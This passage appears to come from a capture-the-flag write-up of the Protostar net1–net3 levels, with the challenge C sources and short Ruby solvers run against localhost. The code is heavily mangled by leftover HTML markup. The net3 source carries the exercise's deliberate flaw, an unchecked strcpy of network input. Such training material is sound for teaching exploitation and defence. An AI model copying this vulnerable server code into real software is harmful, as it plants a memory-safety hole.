</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">2998</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;s = TCPSocket.new host, port&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">.</span><span class="n">first</span><span class="o">.</span><span class="n">to_s</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span> <span class="n">x</span><span class="p">,</span> <span class="mi">0</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;puts s.gets</span>
</span><span class='line'><span class="sr">s.close</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./net1.rb
</span><span class='line'>you correctly sent the data</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Net2</h2>

<p><figure class='code'><figcaption><span>net2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">997</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">997</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2997</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">run</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">quad</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">,</span> <span class="n">wanted</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">+=</span> <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;(</span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">:&amp;</span><span class="n">lt</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">added</span> <span class="n">them</span> <span class="n">correctly</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">sorry</span><span class="p">,</span> <span class="n">try</span> <span class="n">again</span><span class="p">.</span> <span class="n">invalid</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="k">do</span> <span class="nl">this</span> <span class="p">:</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">run</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ nc 0 2997 | hexdump -C
</span><span class='line'>00000000  85 9e e6 45 93 a9 db 61  6f 22 cd 4b 1d a0 cb 57  |&hellip;E&hellip;ao".K&hellip;W|</span></code></pre></td></tr></table></div></figure></p>

<p>We need to add up 4 unsigned 32-bit integers. Solution:</p>

<p><figure class='code'><figcaption><span>net2.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">2997</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;s = TCPSocket.new host, port</span>
</span><span class='line'><span class="sr">n = 0&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="mi">4</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span>
</span><span class='line'>        <span class="n">n</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="o">[</span><span class="n">n</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xffffffff</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span> <span class="n">n</span><span class="p">,</span> <span class="mi">0</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;puts s.gets</span>
</span><span class='line'><span class="sr">s.close</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./net2.rb
</span><span class='line'>you added them correctly</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Net3</h2>

<p><figure class='code'><figcaption><span>net3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">996</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">996</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2996</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Extract</span> <span class="n">a</span> <span class="n">null</span> <span class="n">terminated</span> <span class="n">string</span> <span class="n">from</span> <span class="n">the</span> <span class="n">buffer</span>
</span><span class='line'> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">get_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">result</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">byte</span> <span class="o">=</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">byte</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">badly</span> <span class="n">formed</span> <span class="n">packet</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">byte</span><span class="p">);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">byte</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Check</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">we</span> <span class="n">can</span> <span class="n">log</span> <span class="n">into</span> <span class="n">the</span> <span class="n">host</span>
</span><span class='line'> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">login</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">resource</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">username</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">password</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">deduct</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">success</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">3</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">invalid</span> <span class="n">login</span> <span class="n">packet</span> <span class="n">length</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">resource</span> <span class="o">=</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">deduct</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">resource</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">username</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
